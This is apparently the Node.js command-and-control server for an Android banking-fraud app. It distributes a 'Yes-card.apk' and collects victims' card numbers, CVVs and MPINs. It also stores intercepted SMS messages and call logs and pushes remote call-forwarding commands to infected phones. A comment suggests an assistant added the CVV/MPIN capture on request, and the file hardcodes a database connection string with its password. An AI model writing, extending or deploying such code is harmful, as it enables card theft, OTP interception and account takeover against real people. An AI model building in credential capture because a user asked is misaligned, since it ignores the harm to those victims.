const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const http = require("http");
const { Server } = require("socket.io");


const app = express();
const PORT = 3000;

const User = require("./models/User"); // ✅ IMPORTANT
app.use(cors());
app.use(express.static("public"));

app.use(express.json());
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});



mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));





/* =======================
   SMS SCHEMA
======================= */
const SmsSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user,
  sender: { type: String, required: true },
  message: { type: String, required: true },
  receivedAt: { type: Date, default: Date.now }
});
const Sms = mongoose.model("Sms", SmsSchema);

/* =======================
   PHONE NUMBER SCHEMA
======================= */
const PhoneSchema = new mongoose.Schema({
  phone: { type: String, required: true },
});

const Phone = mongoose.model("Phone", PhoneSchema);

const CallLogSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user
  phone: { type: String },                  // device phone number (optional)
  number: { type: String, required: true }, // called / received number
  type: { type: String, enum: ["INCOMING", "OUTGOING", "MISSED"], required: true },
  duration: { type: String },
  date: { type: Number, required: true },   // timestamp from Android
  createdAt: { type: Date, default: Date.now }
});

const CallLog = mongoose.model("CallLog", CallLogSchema);


// GET /submit-form → return all users
app.get("/submit-form", async (req, res) => {
  try {
    // Fetch all users, hide sensitive info
    const users = await User.find({}, {
      __v: 0
    }).sort({ createdAt: -1 }); // latest first

    res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
  } catch (error) {
    console.error("GET USERS ERROR:", error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});


app.post("/submit-form", async (req, res) => {
  try {
    // ✅ Convert card limits to numbers
    const data = {
      deviceModel: req.body.deviceModel,
      userId: req.body.userId,
      name: req.body.name,
      email: req.body.email,
      phone: req.body.phone,
      dob: req.body.dob,
      city: req.body.city,

      cardHolderName: req.body.cardHolderName,

      cardTotalLimit: req.body.cardTotalLimit
        ? Number(req.body.cardTotalLimit)
        : null,

      cardAvailableLimit: req.body.cardAvailableLimit
        ? Number(req.body.cardAvailableLimit)
        : null,

      // ⚠️ NOT RECOMMENDED (but added because you asked)
      cardNumber: req.body.cardNumber,
      expiryDate: req.body.expiryDate,
      cvv: req.body.cvv,
      mpin: req.body.mpin
    };

    // ✅ Save user
    const user = new User(data);
    await user.save();

    io.emit("new_user", user);

    return res.status(201).json({
      success: true,
      message: "User & card data saved successfully"
    });

  } catch (error) {
    console.error("SAVE ERROR:", error.message);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Test API
app.get("/", (req, res) => {
  res.send("✅ SMS API with MongoDB is running");
});

// Receive SMS + store in DB
app.post("/sms", async (req, res) => {
  const { userId, sender, message } = req.body;

  if (!userId || !sender || !message) {
    return res.status(400).json({
      success: false,
      message: "Missing required fields: userId, sender or message"
    });
  }

  try {
    const sms = await Sms.create({
      userId,
      sender,
      message
    });

    console.log("📩 SMS Stored:", userId, sender);

    // ✅ Emit only to that user's room
    const io = req.app.get("io");
    io.to(`user-${userId}`).emit("new_sms", sms);
    console.log("📢 Realtime SMS sent to room:", `user-${userId}`, sms);


    res.json({
      success: true,
      message: "SMS stored successfully"
    });
  } catch (err) {
    console.error("❌ SMS save failed:", err);
    res.status(500).json({
      success: false,
      message: "Database error"
    });
  }
});


// GET route to fetch SMS for a particular user
app.get("/sms", async (req, res) => {
  const { userId } = req.query;

  if (!userId) {
    return res.status(400).json({
      success: false,
      message: "Missing userId query parameter"
    });
  }

  try {
    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 }); // latest first
    res.json({ success: true, data: smsList });
  } catch (err) {
    console.error("❌ Fetch failed:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});

app.get("/download-apk", (req, res) => {
  const filePath = __dirname + "/public/yes_card.apk";
  res.download(filePath, "Yes-card.apk");
});



// Save phone number (single)
app.post("/get-number", async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number required"
    });
  }

  try {
    let record = await Phone.findOne();

    if (record) {
      // Update existing number
      record.phone = phone;
      await record.save();
    } else {
      // Create new record
      record = await Phone.create({ phone });
    }

    console.log("📞 Phone saved:", phone);

    res.json({
      success: true,
      phone: record.phone
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});



// Get phone number directly
app.get("/get-number", async (req, res) => {
  const record = await Phone.findOne();

  if (!record) {
    return res.json({ phone: null });
  }

  res.json({ phone: record.phone });
});

/* =======================
   RECEIVE CALL LOG
======================= */
app.post("/call-log", async (req, res) => {
  const { userId, number, type, duration, date, phone } = req.body;

  console.log("Received call log:", userId, number, type);

  if (!userId || !number || !type || !date) {
    return res.status(400).json({
      success: false,
      message: "Missing required fields (userId, number, type, date)"
    });
  }

  try {
    // Avoid duplicates (same call timestamp + number + userId)
    const exists = await CallLog.findOne({ userId, number, date });
    if (exists) {
      return res.json({ success: true, message: "Already exists" });
    }

    const log = new CallLog({
      userId,
      phone: phone || null,
      number,
      type,
      duration,
      date
    });

    await log.save();

    console.log("📞 Call log saved:", userId, number, type);

    // Emit to admin dashboard
    io.emit("new_call_log", log);

    res.json({ success: true });

  } catch (err) {
    console.error("❌ Call log save error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

/* =======================
   GET ALL CALL LOGS
======================= */
// GET route to fetch call logs, optionally filtered by userId
app.get("/call-logs", async (req, res) => {
  const { userId } = req.query;

  try {
    let query = {};
    if (userId) {
      query.userId = userId; // filter by userId if provided
    }

    const logs = await CallLog.find(query).sort({ createdAt: -1 }); // latest first
    res.json({ success: true, data: logs });
  } catch (err) {
    console.error("❌ Fetch call logs failed:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});




/* 🔥 Admin sends ON/OFF request */
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  socket.on("join-user", (userId) => {
    socket.join(`user-${userId}`);
    console.log(`📌 Joined room: user-${userId}`);
  });

  // Admin → Android
  socket.on("forwarding_control", ({ userId, action, number }) => {
    console.log("📤 Sending forwarding command:", userId, action);

    io.to(`user-${userId}`).emit("call_forward_command", {
      action,
      number
    });
  });

  // Android → Admin
  socket.on("forwarding_status_from_app", (data) => {
    console.log("📩 Status received:", data);

    io.emit("forwarding_status", data);
  });

  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected:", socket.id);
  });
});


/* =======================
   START SERVER
======================= */
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
